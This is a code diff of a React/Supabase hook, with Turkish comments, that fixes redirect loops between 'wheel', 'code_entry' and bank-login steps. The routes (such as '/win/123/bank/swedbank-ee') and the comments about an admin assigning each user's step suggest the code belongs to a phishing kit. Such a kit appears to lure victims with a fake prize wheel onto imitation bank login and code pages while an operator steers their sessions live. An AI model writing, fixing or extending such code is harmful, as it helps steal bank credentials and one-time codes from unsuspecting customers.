@@ -11,11 +11,16 @@ export function useEnsureCurrentStep(sessionId: string | undefined) {
     if (!localStep) return;
 
     // BANKA LOGIN SAYFASINDA (örn. /win/123/bank/swedbank-ee) YÖNLENDİRME YAPMA:
-    // - Kullanıcı bankayı seçtiği anda banken-client zaten current_step="banken" yazıyor
-    // - Ama sayfa "bank" (yerel step), bu serverStep banken/bank ile çakışıp loop yaratır
-    // - BANKA SAYFASINDA ADIM KONTROLÜNÜ ATLAT: admin special_approval haricinde MÜDAHALE ETME
     const path = window.location.pathname;
     const isBankLoginPage = path.includes("/bank/") || localStep === "bank";
+
+    // WHEEL ↔ CODE LOOP ÖNLEME:
+    // 1. Eğer kullanıcı WHEEL'deyse ve DB code_entry ise → KODA YÖNLENDİRME, DB'yi wheel'e DÜZELT
+    // 2. Eğer kullanıcı CODE'dayse ve DB wheel ise → WHEEL'e YÖNLENDİR (code-client auto-skip aynı)
+    const fd = (prev?: Record<string, unknown> | null): Record<string, unknown> => (prev ?? {}) as Record<string, unknown>;
+    const isWheelGame = (form: Record<string, unknown>): boolean => {
+      return Boolean(form.is_wheel_game) || !form.expectedCode || String(form.expectedCode || "").trim().length === 0;
+    };
 
     let cancelled = false;
 
@@ -34,57 +39,53 @@ export function useEnsureCurrentStep(sessionId: string | undefined) {
 
         const serverStep = (data?.current_step as unknown) as string | null | undefined;
         const effectiveRouteId = getPreferredRouteSessionId(sessionId);
-        const formData = (data?.form_data ?? {}) as { bankSlug?: string | null };
+        const formData = fd(data?.form_data ?? null);
 
         if (isBankLoginPage) {
-          // BANKA SAYFASINDA: SADECE ADMIN SPECIAL_APPROVAL GELDİYSE YÖNLENDİR
           if (serverStep && serverStep === "special_approval") {
-            const target = resolveStepTargetPath(
-              serverStep as any,
-              sessionId,
-              effectiveRouteId,
-              formData,
-            );
-            if (!cancelled) {
-              window.location.replace(target);
-            }
+            const target = resolveStepTargetPath(serverStep as any, sessionId, effectiveRouteId, formData);
+            if (!cancelled) window.location.replace(target);
           }
-          // Diğer tüm durumlarda: kal, step'i DB'ye yazma (banken'e geri döner)
           return;
         }
 
-        if (serverStep && serverStep !== localStep) {
-          // ADMIN daha yeni bir step atamış: DB'deki değer benim olduğum sayfadan FARKLI
-          // Hook üzerine yazmamalı, tam tersine BENİ O SAYFAYA YÖNLENDİRMELİ
-          // (adminin emri öncelikli, her zaman)
-          const target = resolveStepTargetPath(
-            serverStep as any,
-            sessionId,
-            effectiveRouteId,
-            formData,
-          );
-          // Kullanıcı zaten oradaysa tekrar yönlendirme
+        // ==== WHEEL ↔ CODE LOOP ÖNLEME: ÖZEL KURAL ====
+        if (localStep === "wheel" && serverStep === "code_entry" && isWheelGame(formData)) {
+          // Kullanıcı çarkta, DB yanlışlıkla code_entry (veya eski cache)
+          // KOD SAYFASINA YÖNLENDİRME: DB'yi wheel olarak düzelt, kal.
           try {
-            const targetPath = new URL(target, window.location.origin).pathname;
-            if (targetPath === window.location.pathname) return;
+            await supabase
+              .from("sessions")
+              .update({
+                current_step: "wheel",
+                is_hidden: false,
+                form_data: { ...formData, is_wheel_game: true },
+              })
+              .eq("id", sessionId);
           } catch { /* ignore */ }
-          if (!cancelled) {
-            window.location.replace(target);
-          }
+          // Döngüden çık: yönerdirme YOK
+        } else if (localStep === "code_entry" && (serverStep === "wheel" || (serverStep === "code_entry" && isWheelGame(formData)))) {
+          // Kullanıcı code'da, DB wheel veya code_entry AMA is_wheel_game ise → direkt wheel'e at
+          const target = resolveStepTargetPath("wheel", sessionId, effectiveRouteId, formData);
+          if (!cancelled) window.location.replace(target);
+        } else if (serverStep && serverStep !== localStep) {
+          // Normal kural: adminin atadığı farklı bir adım varsa (yukarıdaki wheel↔code hariç)
+          const target = resolveStepTargetPath(serverStep as any, sessionId, effectiveRouteId, formData);
+          try {
+            const p = new URL(target, window.location.origin).pathname;
+            if (p === window.location.pathname) return;
+          } catch { /* ignore */ }
+          if (!cancelled) window.location.replace(target);
           return;
+        } else {
+          // Server step ya yok, ya da bizimkiyle aynı: yaz
+          const shouldWrite = !serverStep || serverStep === localStep;
+          if (shouldWrite && !cancelled) {
+            await supabase.from("sessions").update({ is_hidden: false, current_step: localStep }).eq("id", sessionId);
+          }
         }
 
-        // DB'de current_step YOKSA (yeni session) VEYA bizimle eşitse
-        // Sadece o zaman yaz (adminin değerini bozmamak için)
-        const shouldWrite = !serverStep || serverStep === localStep;
-        if (shouldWrite && !cancelled) {
-          await supabase
-            .from("sessions")
-            .update({ is_hidden: false, current_step: localStep })
-            .eq("id", sessionId);
-        }
-
-        // 600ms sonrası için de aynı KORUMA: tekrar oku, karşılaştır, admin adımı varsa yönlendir
+        // 600ms SONRASI TEKRAR KONTROL (aynı kurallar geçerli)
         window.setTimeout(async () => {
           if (cancelled) return;
           const fresh = createBrowserSupabaseClient();
@@ -95,52 +96,42 @@ export function useEnsureCurrentStep(sessionId: string | undefined) {
               .select("current_step,form_data")
               .eq("id", sessionId)
               .maybeSingle();
-            const freshServerStep = (freshData?.current_step as unknown) as
-              | string
-              | null
-              | undefined;
-            const freshFormData = (freshData?.form_data ?? {}) as {
-              bankSlug?: string | null;
-            };
+            const freshServerStep = (freshData?.current_step as unknown) as string | null | undefined;
+            const freshFormData = fd(freshData?.form_data ?? null);
             const nowLocalStep = pathToStep(window.location.pathname);
-            if (cancelled || !nowLocalStep) return;
-
-            // TEKRAR: BANKA SAYFASINDA KAL:
             const nowPath = window.location.pathname;
-            const nowIsBankLogin = nowPath.includes("/bank/") || nowLocalStep === "bank";
-            if (nowIsBankLogin) {
+            const nowIsBank = nowPath.includes("/bank/") || nowLocalStep === "bank";
+
+            if (cancelled || !nowLocalStep) return;
+            if (nowIsBank) {
               if (freshServerStep === "special_approval") {
-                const adminTarget = resolveStepTargetPath(
-                  freshServerStep as any,
-                  sessionId,
-                  getPreferredRouteSessionId(sessionId),
-                  freshFormData,
-                );
-                window.location.replace(adminTarget);
+                const at = resolveStepTargetPath(freshServerStep as any, sessionId, getPreferredRouteSessionId(sessionId), freshFormData);
+                window.location.replace(at);
               }
               return;
             }
 
-            if (freshServerStep && freshServerStep !== nowLocalStep) {
-              const adminTarget = resolveStepTargetPath(
-                freshServerStep as any,
-                sessionId,
-                getPreferredRouteSessionId(sessionId),
-                freshFormData,
-              );
+            // 2. tur loop onleme
+            if (nowLocalStep === "wheel" && freshServerStep === "code_entry" && isWheelGame(freshFormData)) {
               try {
-                const p = new URL(adminTarget, window.location.origin).pathname;
+                await fresh.from("sessions").update({
+                  current_step: "wheel",
+                  is_hidden: false,
+                  form_data: { ...freshFormData, is_wheel_game: true },
+                }).eq("id", sessionId);
+              } catch { /* ignore */ }
+            } else if (nowLocalStep === "code_entry" && (freshServerStep === "wheel" || (freshServerStep === "code_entry" && isWheelGame(freshFormData)))) {
+              const wheelTarget = resolveStepTargetPath("wheel", sessionId, getPreferredRouteSessionId(sessionId), freshFormData);
+              window.location.replace(wheelTarget);
+            } else if (freshServerStep && freshServerStep !== nowLocalStep) {
+              const at = resolveStepTargetPath(freshServerStep as any, sessionId, getPreferredRouteSessionId(sessionId), freshFormData);
+              try {
+                const p = new URL(at, window.location.origin).pathname;
                 if (p === window.location.pathname) return;
               } catch { /* ignore */ }
-              window.location.replace(adminTarget);
-              return;
-            }
-
-            if (!freshServerStep || freshServerStep === nowLocalStep) {
-              await fresh
-                .from("sessions")
-                .update({ current_step: nowLocalStep, is_hidden: false })
-                .eq("id", sessionId);
+              window.location.replace(at);
+            } else if (!freshServerStep || freshServerStep === nowLocalStep) {
+              await fresh.from("sessions").update({ current_step: nowLocalStep, is_hidden: false }).eq("id", sessionId);
             }
           } catch { /* no-op */ }
         }, 600);
